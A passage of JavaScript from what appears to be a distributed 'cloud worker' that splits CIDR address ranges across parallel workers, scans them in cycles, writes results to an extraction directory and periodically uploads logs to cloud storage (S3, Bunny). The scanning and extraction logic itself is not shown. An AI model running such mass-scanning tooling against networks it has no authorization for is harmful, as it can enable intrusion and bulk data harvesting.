    if (LOAD_FROM_CIDR && cidrPoolShared) {
      await gatherAndScanCycle(cidrPoolShared, workerId, NUM_WORKERS, cycle);
      log(`[W${workerId}] Cycle #${cycle} completed.`);
    }
    if (LOAD_FROM_SITE && !LOAD_FROM_CIDR) {
      log(`[SYS] Worker ${workerId} \u2014 Done. No CIDR active, exiting.`);
      break;
    }
    if (!LOAD_FROM_SITE && !LOAD_FROM_CIDR) break;
    await sleep(2e3);
  }
}
function startLogUploadLoop() {
  setInterval(() => {
    uploadLog().catch(() => {
    });
  }, LOG_UPLOAD_INTERVAL * 1e3);
}
async function main() {
  if (LOG_ACTIVE) {
    await fs.promises.mkdir(LOGS_DIR, { recursive: true });
    const containerId = process.env.HOSTNAME || `local_${Math.floor(Date.now() / 1e3)}`;
    LOG_PATH = path.join(LOGS_DIR, `${containerId}.log`);
    const tee = new TeeLogger(LOG_PATH);
    console.log = (...args) => {
      const msg = args.map((a) => typeof a === "string" ? a : JSON.stringify(a)).join(" ") + "\n";
      tee.write(msg);
    };
    console.error = console.log;
  }
  log("\n[SYS] Cloud worker starting...");
  if (LOG_ACTIVE) log(`[SYS] Log saved to: ${LOG_PATH}`);
  await fs.promises.mkdir(RESULT_DIR, { recursive: true });
  await fs.promises.mkdir(NEW_PATH_EXTRACT, { recursive: true });
  log(`[SYS] AWS_S3=${AWS_S3}  BUNNY_STORAGE=${BUNNY_STORAGE}`);
  log(`[SYS] LOAD_FROM_SITE=${LOAD_FROM_SITE}  LOAD_FROM_CIDR=${LOAD_FROM_CIDR}`);
  log(`[SYS] Container-ID=${INSTANCE_ID} (of ${TOTAL_SLOTS} slots), ${NUM_WORKERS} workers, ~${MAX_IPS_PER_CIDR} IP/CIDR`);
  if (!LOAD_FROM_SITE && !LOAD_FROM_CIDR) {
    log("[SYS] ERROR: LOAD_FROM_SITE=false and LOAD_FROM_CIDR=false. No target source. Exiting.");
    return;
  }
  log(`[SYS] Starting ${NUM_WORKERS} worker(s)`);
  startLogUploadLoop();
  cidrPoolShared = await initCidrPool();
  if (LOAD_FROM_CIDR && !cidrPoolShared) {
    log("[SYS] ERROR: LOAD_FROM_CIDR=true but no CIDRs available. Exiting.");
    return;
  }
  const workers = [];
  for (let w = 0; w < NUM_WORKERS; w++) {
    workers.push(workerLoop(w).catch((e) => log(`[SYS] Worker ${w} crashed: ${e.message}`)));
  }
  await Promise.all(workers);
  log("[SYS] All workers finished.");
}
if (require.main === module) {
  main().catch((e) => {
    console.error(`[FATAL] ${e.message}`, e.stack);
    process.exit(1);
  });
}
